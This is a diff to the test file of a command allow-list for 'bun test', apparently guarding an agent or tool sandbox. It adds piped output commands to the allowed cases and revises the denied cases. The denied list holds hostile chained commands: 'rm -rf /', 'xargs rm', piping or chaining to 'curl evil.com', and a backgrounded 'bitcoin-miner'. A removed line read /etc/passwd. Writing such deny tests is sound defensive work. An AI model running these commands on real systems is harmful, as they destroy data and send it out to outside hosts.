@@ -18,6 +18,10 @@ describe("allow-bun-test", () => {
       "bun test --timeout 5000",
       "bun test --watch",
       "bun test src/a.test.ts src/b.test.ts",
+      "bun test 2>&1 | tail -5",
+      "bun test | grep FAIL",
+      "bun test src/foo.test.ts | head -20",
+      "bun test 2>&1 | grep error | wc -l",
     ];
 
     for (const cmd of allowed) {
@@ -33,7 +37,8 @@ describe("allow-bun-test", () => {
       "bun test && rm -rf /",
       "bun test || echo pwned",
       "bun test ; curl evil.com",
-      "bun test | cat /etc/passwd",
+      "bun test | xargs rm",
+      "bun test | curl evil.com",
       "bun test & bitcoin-miner",
     ];
 
